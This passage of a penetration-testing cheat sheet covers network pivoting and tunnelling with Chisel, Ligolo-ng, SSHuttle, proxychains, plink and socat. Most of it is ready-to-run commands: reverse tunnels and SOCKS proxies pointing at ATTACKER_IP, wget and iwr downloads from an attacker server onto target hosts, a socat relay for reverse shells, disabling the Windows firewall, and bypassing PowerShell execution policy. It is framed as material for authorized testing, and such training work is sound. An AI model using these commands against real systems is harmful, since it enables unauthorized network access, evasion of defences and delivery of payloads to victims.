proxy_dns_old  # Use old method if new one fails
```

**Problem: Tool doesn't work with proxychains**
```bash
# Some tools don't support SOCKS proxying
# Workaround: Use Ligolo-ng or SSHuttle instead

# For nmap, always use:
proxychains4 nmap -sT -Pn target
# -sT: TCP connect (required)
# -Pn: Skip ping (ICMP doesn't work through SOCKS)
```

**Problem: "ERROR: ld.so: object 'libproxychains.so.3'"**
```bash
# Find correct library
find /usr -name "libproxychains*"

# Update config with correct path
sudo vim /etc/proxychains4.conf
# Update: /usr/lib/libproxychains4.so (or wherever it is)
```

### Windows Specific Issues

**Problem: PowerShell execution policy blocks scripts**
```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# Or set for current session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

**Problem: Windows Firewall blocks tunneling tools**
```cmd
# Disable firewall (if you have admin)
netsh advfirewall set allprofiles state off

# Or add specific rule
netsh advfirewall firewall add rule name="Chisel" dir=in action=allow program="C:\Temp\chisel.exe"
```

**Problem: Plink asks to cache host key (breaks automation)**
```cmd
# Auto-accept with echo
echo y | plink.exe -R 9999:127.0.0.1:80 user@ATTACKER_IP -pw password

# Or use -batch flag (doesn't prompt)
plink.exe -batch -R 9999:127.0.0.1:80 user@ATTACKER_IP -pw password
```

### General Networking Issues

**Problem: Can't reach internal network after setting up tunnel**
```bash
# Check routing table
ip route  # Linux
route print  # Windows
netstat -nr  # macOS

# Verify tunnel interface is UP
ip addr show

# Test connectivity
ping INTERNAL_IP
traceroute INTERNAL_IP

# Check if packet forwarding is enabled (Linux)
sysctl net.ipv4.ip_forward  # Should be 1
sudo sysctl -w net.ipv4.ip_forward=1
```

**Problem: Slow tunnel performance**
```bash
# For SSH-based tunnels, enable compression
ssh -C -D 1080 user@host

# For Chisel, try different port (avoid port 80/443 if proxy interferes)
./chisel server -p 9999 --reverse

# For Ligolo-ng, check MTU settings
# Reduce MTU if needed
sudo ip link set ligolo mtu 1400
```

**Problem: Firewall blocks outbound connections**
```bash
# Try common allowed ports
# 80 (HTTP), 443 (HTTPS), 53 (DNS), 22 (SSH)

# Chisel over HTTPS port
./chisel server -p 443 --reverse

# Ligolo-ng over HTTPS
./proxy -selfcert -laddr 0.0.0.0:443

# SSH over 443
ssh -p 443 user@host
```

---

## Quick Command Reference

### Most Common Commands

```bash
# Quick SOCKS proxy with Chisel
./chisel server -p 8080 --reverse                  # Attacker
./chisel client ATTACKER_IP:8080 R:1080:socks     # Target

# Ligolo-ng full tunnel
./proxy -selfcert -laddr 0.0.0.0:11601 -autoroute # Attacker
./agent -connect ATTACKER_IP:11601 -ignore-cert   # Target
# Then: session 1 -> start

# SSHuttle VPN
sshuttle -r user@pivot 10.0.0.0/8 --dns -vv

# Reverse port forward
ssh -R 8080:localhost:80 user@attacker            # SSH
./chisel client ATTACKER_IP:8080 R:8080:localhost:80  # Chisel
plink.exe -R 8080:localhost:80 user@attacker -pw pass  # Plink

# Local port forward
ssh -L 8080:internal-host:80 user@pivot
./chisel client ATTACKER_IP:8080 L:8080:internal-host:80

# Dynamic SOCKS
ssh -D 1080 user@pivot
./chisel client ATTACKER_IP:8080 1080:socks

# Using proxychains
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 firefox
proxychains4 msfconsole

# File transfer
python3 -m http.server 8000                       # Attacker
wget http://ATTACKER_IP:8000/file -O /tmp/file    # Target Linux
iwr http://ATTACKER_IP:8000/file -o C:\Temp\file  # Target Windows

# Reverse shell relay with socat
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444   # Pivot
# Victim connects to pivot:4444
```

---

## Additional Resources

### Port Reference
```
Common Tunnel Ports:
- 11601: Ligolo-ng default
- 8080: Chisel default (HTTP alternative)
- 1080: SOCKS proxy standard
- 8888: Alternative HTTP forward
- 9050: Tor SOCKS proxy
- 22: SSH
```

### Testing Connectivity
```bash
# Check if port is open
nc -zv TARGET_IP PORT

# Check HTTP service
curl -I http://TARGET_IP:PORT

# Check SOCKS proxy
curl --socks5 127.0.0.1:1080 http://target

# Test route
ping TARGET_IP
traceroute TARGET_IP

# Check listening ports on local
ss -tlnp          # Linux
netstat -an | find "LISTEN"  # Windows
```

### Useful Aliases (Add to ~/.bashrc or ~/.zshrc)
```bash
# Quick HTTP server
alias serve='python3 -m http.server 8000'

# Quick SOCKS with Chisel
alias chisel-server='~/tools/chisel/chisel server -p 8080 --reverse'

# Proxychains shortcut
alias pc='proxychains4 -q'

# Quick nmap through proxy
alias pcnmap='proxychains4 nmap -sT -Pn'
```

---

**Created for Security Testing & Authorized Penetration Testing Only**
